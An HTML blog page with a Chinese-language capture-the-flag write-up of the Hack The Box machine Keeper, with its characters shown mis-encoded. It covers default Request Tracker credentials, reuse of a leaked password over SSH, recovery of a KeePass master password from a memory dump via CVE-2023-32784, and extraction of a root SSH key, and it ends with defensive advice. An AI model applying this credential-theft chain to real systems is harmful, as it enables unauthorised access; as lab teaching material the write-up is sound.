<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HTB: Keeper | HackwithControler</title>
<link rel="stylesheet" href="../static/css/main.css">
</head>
<body>
<header>
    <div class="container">
        <a href="../index.html" class="back">â† è¿”å›é¦–é </a>
    </div>
</header>

<div class="article-layout">
    <!-- Left Sidebar: Article List -->
    <aside class="sidebar-left">
        <h3>ğŸ“ å…¶ä»– Write-ups</h3><div class="sidebar-articles">
            <a href="htb_pilgrimage.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Pilgrimage</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-09-18</span>
                </div>
            </a>
            <a href="htb_keeper.html" class="sidebar-article-item active">
                <div class="sidebar-article-title">HTB: Keeper</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-10-05</span>
                </div>
            </a>
            <a href="htb_surveillance.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Surveillance</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty medium">Medium</span>
                    <span>2024-11-20</span>
                </div>
            </a>
            <a href="htb_analytics.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Analytics</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-12-15</span>
                </div>
            </a></div>
    </aside>

    <!-- Main Content -->
    <main class="article-main">
        <div class="article-header">
            <h1>HTB: Keeper</h1>
            <div class="article-meta">
                <span class="difficulty easy">Easy</span>
                <span>ğŸ“… 2024-10-05</span>
                <span>â± 23 min read</span>
            </div>
            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">Request Tracker</span><span class="article-tag">KeePass</span><span class="article-tag">CVE-2023-32784</span></div>
        </div>
        <div class="article-content"><h2 id="_1">æ©Ÿå™¨è³‡è¨Š</h2>
<ul>
<li>å¹³å°: Hack The Box</li>
<li>é›£åº¦: Easy</li>
<li>IP: 10.10.11.227</li>
<li>ä½œæ¥­ç³»çµ±: Linux (Debian)</li>
</ul>
<h2 id="_2">åµå¯Ÿ</h2>
<h3 id="nmap">Nmap æƒæ</h3>
<pre class="codehilite"><code class="language-bash">nmap -sC -sV -oN nmap/keeper 10.10.11.227
</code></pre>

<p>é–‹æ”¾ç«¯å£ï¼š<br />
- <strong>22/tcp</strong> - SSH (OpenSSH 8.9p1)<br />
- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
<h3 id="web">Web æšèˆ‰</h3>
<p>è¨ªå• <code>http://10.10.11.227</code> é‡å®šå‘åˆ° <code>http://tickets.keeper.htb/rt/</code></p>
<p>æ·»åŠ åˆ° hosts æ–‡ä»¶ï¼š</p>
<pre class="codehilite"><code class="language-bash">echo &quot;10.10.11.227 keeper.htb tickets.keeper.htb&quot; | sudo tee -a /etc/hosts
</code></pre>

<p>ç¶²ç«™é‹è¡Œ <strong>Request Tracker (RT)</strong> ç¥¨å‹™ç³»çµ±ã€‚</p>
<h2 id="initial-access">Initial Access</h2>
<h3 id="request-tracker">Request Tracker é è¨­æ†‘è­‰</h3>
<p>å˜—è©¦é è¨­æ†‘è­‰ç™»å…¥ï¼š</p>
<pre class="codehilite"><code>Username: root
Password: password
</code></pre>

<p>æˆåŠŸç™»å…¥ç®¡ç†ä»‹é¢ï¼</p>
<h3 id="_3">ç”¨æˆ¶æšèˆ‰</h3>
<p>åœ¨ Admin â†’ Users æ‰¾åˆ°å…©å€‹ç”¨æˆ¶ï¼š</p>
<ol>
<li><strong>root</strong> (Admin)</li>
<li><strong>lnorgaard</strong> (Lise NÃ¸rgaard)</li>
</ol>
<p>æŸ¥çœ‹ lnorgaard çš„ç”¨æˆ¶è³‡æ–™ï¼Œåœ¨å‚™è¨»æ¬„ç™¼ç¾ï¼š</p>
<pre class="codehilite"><code>Initial password: Welcome2023!
</code></pre>

<h3 id="ssh">SSH ç™»å…¥</h3>
<pre class="codehilite"><code class="language-bash">ssh lnorgaard@10.10.11.227
# Password: Welcome2023!
</code></pre>

<p>æˆåŠŸç™»å…¥ä¸¦å–å¾— user flagï¼š</p>
<pre class="codehilite"><code class="language-bash">cat ~/user.txt
</code></pre>

<h2 id="_4">æ¬Šé™æå‡</h2>
<h3 id="_5">æª”æ¡ˆç™¼ç¾</h3>
<p>åœ¨ç”¨æˆ¶ä¸»ç›®éŒ„ç™¼ç¾å…©å€‹æœ‰è¶£çš„æª”æ¡ˆï¼š</p>
<pre class="codehilite"><code class="language-bash">ls -la ~
</code></pre>

<pre class="codehilite"><code>RT30000.zip
KeePassDumpFull.dmp
</code></pre>

<h3 id="_6">ä¸‹è¼‰æª”æ¡ˆ</h3>
<pre class="codehilite"><code class="language-bash">scp lnorgaard@10.10.11.227:~/RT30000.zip .
scp lnorgaard@10.10.11.227:~/KeePassDumpFull.dmp .
</code></pre>

<p>è§£å£“ ZIP æª”ï¼š</p>
<pre class="codehilite"><code class="language-bash">unzip RT30000.zip
</code></pre>

<p>å¾—åˆ°ï¼š<br />
- <code>passcodes.kdbx</code> - KeePass è³‡æ–™åº«<br />
- <code>KeePassDumpFull.dmp</code> - è¨˜æ†¶é«”å‚¾å°æª”</p>
<h3 id="keepass">KeePass è³‡æ–™åº«</h3>
<p>å˜—è©¦ç”¨å¸¸è¦‹å¯†ç¢¼æ‰“é–‹ <code>.kdbx</code> æª”æ¡ˆå¤±æ•—ã€‚</p>
<p>ä½†æˆ‘å€‘æœ‰è¨˜æ†¶é«” dump æª”æ¡ˆï¼</p>
<h3 id="cve-2023-32784-keepass-master-password-dumper">CVE-2023-32784 - KeePass Master Password Dumper</h3>
<p>KeePass 2.X ç‰ˆæœ¬å­˜åœ¨ä¸€å€‹åš´é‡æ¼æ´ï¼Œå¯ä»¥å¾è¨˜æ†¶é«”æˆ–äº¤æ›æª”æ¡ˆä¸­æ¢å¾©ä¸»å¯†ç¢¼ã€‚</p>
<p><strong>æ¼æ´åŸç†ï¼š</strong><br />
- KeePass åœ¨è™•ç†ä¸»å¯†ç¢¼æ™‚æœƒå°‡å­—ç¬¦é€å€‹åŠ å…¥ SecureString<br />
- æ¯å€‹å­—ç¬¦çš„æ®˜ç•™æ•¸æ“šæœƒç•™åœ¨è¨˜æ†¶é«”ä¸­<br />
- å¯ä»¥é€šéæ¨¡å¼åŒ¹é…æ¢å¾©å¯†ç¢¼ï¼ˆé™¤äº†ç¬¬ä¸€å€‹å­—ç¬¦ï¼‰</p>
<h3 id="poc">ä½¿ç”¨ POC å·¥å…·</h3>
<pre class="codehilite"><code class="language-bash">git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run ~/KeePassDumpFull.dmp
</code></pre>

<p>è¼¸å‡ºï¼š</p>
<pre class="codehilite"><code>Found: â—Ã¸dgrÃ¸d med flÃ¸de
</code></pre>

<p>ç¬¬ä¸€å€‹å­—ç¬¦æ˜¯æœªçŸ¥çš„ï¼ˆç”¨ â— è¡¨ç¤ºï¼‰ï¼Œä½†å¾Œé¢çš„å­—ç¬¦æ˜¯æ¸…æ™°çš„ã€‚</p>
<h3 id="_7">ç ´è§£ä¸»å¯†ç¢¼</h3>
<p><code>Ã¸dgrÃ¸d med flÃ¸de</code> çœ‹èµ·ä¾†åƒä¸¹éº¥èªã€‚Google æœç´¢ç™¼ç¾é€™æ˜¯ä¸€é“ä¸¹éº¥å‚³çµ±ç”œé»ï¼š</p>
<p><strong>RÃ¸dgrÃ¸d med flÃ¸de</strong> ï¼ˆç´…æ¼¿æœå¸ƒä¸é…å¥¶æ²¹ï¼‰</p>
<p>å˜—è©¦å®Œæ•´å¯†ç¢¼ï¼š</p>
<pre class="codehilite"><code class="language-bash">keepassxc-cli open passcodes.kdbx
# Enter password: rÃ¸dgrÃ¸d med flÃ¸de
</code></pre>

<p>æˆåŠŸæ‰“é–‹ï¼</p>
<h3 id="_8">æå–æ†‘è­‰</h3>
<pre class="codehilite"><code class="language-bash">keepassxc-cli show passcodes.kdbx &quot;keeper.htb (Ticketing Server)&quot;
</code></pre>

<p>æ‰¾åˆ° root ç”¨æˆ¶çš„ SSH å¯†é‘°å’Œ PuTTY æ ¼å¼çš„ç§é‘°ï¼</p>
<h3 id="putty">PuTTY ç§é‘°æå–</h3>
<p>åœ¨ Notes æ¬„ä½ç™¼ç¾å®Œæ•´çš„ PuTTY ç§é‘°ï¼š</p>
<pre class="codehilite"><code>PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
...ï¼ˆçœç•¥ï¼‰...
</code></pre>

<h3 id="putty-openssh">è½‰æ› PuTTY å¯†é‘°ç‚º OpenSSH æ ¼å¼</h3>
<p>å°‡ PuTTY å¯†é‘°å…§å®¹ä¿å­˜ç‚º <code>root.ppk</code>ï¼Œç„¶å¾Œè½‰æ›ï¼š</p>
<pre class="codehilite"><code class="language-bash">puttygen root.ppk -O private-openssh -o root.key
chmod 600 root.key
</code></pre>

<h3 id="ssh-root">SSH ä»¥ Root ç™»å…¥</h3>
<pre class="codehilite"><code class="language-bash">ssh -i root.key root@10.10.11.227
</code></pre>

<p>æˆåŠŸç²å¾— root shellï¼</p>
<pre class="codehilite"><code class="language-bash">cat /root/root.txt
</code></pre>

<h2 id="flags">Flags</h2>
<pre class="codehilite"><code>user.txt: 9********************************5
root.txt: f********************************c
</code></pre>

<h2 id="_9">ç¸½çµ</h2>
<p>Keeper æ˜¯ä¸€å€‹å¾ˆæ£’çš„ Easy ç´šåˆ¥æ©Ÿå™¨ï¼Œæ•™å°äº†å¤šå€‹é‡è¦æ¦‚å¿µï¼š</p>
<h3 id="_10">æ”»æ“Šè·¯å¾‘</h3>
<ol>
<li><strong>é è¨­æ†‘è­‰</strong> â†’ RT Admin è¨ªå•</li>
<li><strong>è³‡è¨Šæ´©éœ²</strong> â†’ ç”¨æˆ¶å¯†ç¢¼</li>
<li><strong>SSH è¨ªå•</strong> â†’ ç”¨æˆ¶æ¬Šé™</li>
<li><strong>CVE-2023-32784</strong> â†’ KeePass ä¸»å¯†ç¢¼æ¢å¾©</li>
<li><strong>æ†‘è­‰æå–</strong> â†’ Root SSH å¯†é‘°</li>
<li><strong>å¯†é‘°è½‰æ›</strong> â†’ Root è¨ªå•</li>
</ol>
<h3 id="_11">å­¸ç¿’è¦é»</h3>
<ul>
<li>å§‹çµ‚å˜—è©¦é è¨­æ†‘è­‰</li>
<li>æ³¨æ„æ‡‰ç”¨ç¨‹å¼ä¸­çš„è¨»è§£å’Œå‚™è¨»</li>
<li>KeePass è¨˜æ†¶é«”æ¼æ´çš„å¯¦éš›åˆ©ç”¨</li>
<li>PuTTY èˆ‡ OpenSSH å¯†é‘°æ ¼å¼è½‰æ›</li>
<li>å¯†ç¢¼ç®¡ç†å™¨çš„å®‰å…¨æ€§</li>
</ul>
<h3 id="_12">é˜²ç¦¦å»ºè­°</h3>
<ol>
<li><strong>æ›´æ”¹é è¨­æ†‘è­‰</strong>ï¼šæ‰€æœ‰ç³»çµ±éƒ½æ‡‰è©²æ›´æ”¹é è¨­å¯†ç¢¼</li>
<li><strong>é¿å…æ˜æ–‡å¯†ç¢¼</strong>ï¼šä¸è¦åœ¨ç¥¨å‹™ç³»çµ±æˆ–æ–‡æª”ä¸­å­˜å„²å¯†ç¢¼</li>
<li><strong>æ›´æ–° KeePass</strong>ï¼šå‡ç´šåˆ°ä¿®å¾© CVE-2023-32784 çš„ç‰ˆæœ¬</li>
<li><strong>é™åˆ¶è¨˜æ†¶é«” Dump</strong>ï¼šä¿è­·é€²ç¨‹è¨˜æ†¶é«”ä¸è¢«éæˆæ¬Šè¨ªå•</li>
<li><strong>SSH å¯†é‘°ä¿è­·</strong>ï¼šä½¿ç”¨å¯†ç¢¼ä¿è­·ç§é‘°</li>
</ol>
<h3 id="_13">å·¥å…·</h3>
<ul>
<li><strong>keepass-password-dumper</strong>: CVE-2023-32784 åˆ©ç”¨å·¥å…·</li>
<li><strong>KeePassXC</strong>: è·¨å¹³å°å¯†ç¢¼ç®¡ç†å™¨</li>
<li><strong>PuTTYgen</strong>: å¯†é‘°æ ¼å¼è½‰æ›å·¥å…·</li>
</ul>
<h2 id="_14">åƒè€ƒè³‡æ–™</h2>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32784">CVE-2023-32784 - KeePass Master Password Disclosure</a></li>
<li><a href="https://docs.bestpractical.com/rt/">Request Tracker Documentation</a></li>
<li><a href="https://keepass.info/help/base/security.html">KeePass Security Issues</a></li>
</ul></div>
    </main>

    <!-- Right Sidebar: TOC -->
    <aside class="sidebar-right">
        <h3>ğŸ“‘ ç›®éŒ„</h3><ul class="toc-list">
            <li class="toc-item toc-item-h2">
                <a href="#_1" class="toc-link">æ©Ÿå™¨è³‡è¨Š</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_2" class="toc-link">åµå¯Ÿ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#nmap" class="toc-link">Nmap æƒæ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#web" class="toc-link">Web æšèˆ‰</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#initial-access" class="toc-link">Initial Access</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#request-tracker" class="toc-link">Request Tracker é è¨­æ†‘è­‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_3" class="toc-link">ç”¨æˆ¶æšèˆ‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#ssh" class="toc-link">SSH ç™»å…¥</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_4" class="toc-link">æ¬Šé™æå‡</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_5" class="toc-link">æª”æ¡ˆç™¼ç¾</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_6" class="toc-link">ä¸‹è¼‰æª”æ¡ˆ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#keepass" class="toc-link">KeePass è³‡æ–™åº«</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2023-32784-keepass-master-password-dumper" class="toc-link">CVE-2023-32784 - KeePass Master Password Dumper</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#poc" class="toc-link">ä½¿ç”¨ POC å·¥å…·</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_7" class="toc-link">ç ´è§£ä¸»å¯†ç¢¼</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_8" class="toc-link">æå–æ†‘è­‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#putty" class="toc-link">PuTTY ç§é‘°æå–</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#putty-openssh" class="toc-link">è½‰æ› PuTTY å¯†é‘°ç‚º OpenSSH æ ¼å¼</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#ssh-root" class="toc-link">SSH ä»¥ Root ç™»å…¥</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#flags" class="toc-link">Flags</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_9" class="toc-link">ç¸½çµ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_10" class="toc-link">æ”»æ“Šè·¯å¾‘</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_11" class="toc-link">å­¸ç¿’è¦é»</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_12" class="toc-link">é˜²ç¦¦å»ºè­°</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_13" class="toc-link">å·¥å…·</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_14" class="toc-link">åƒè€ƒè³‡æ–™</a>
            </li></ul>
    </aside>
</div>

<footer>
    <div class="container">
        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
    </div>
</footer>

<script src="../static/js/article.js"></script>
</body>
</html>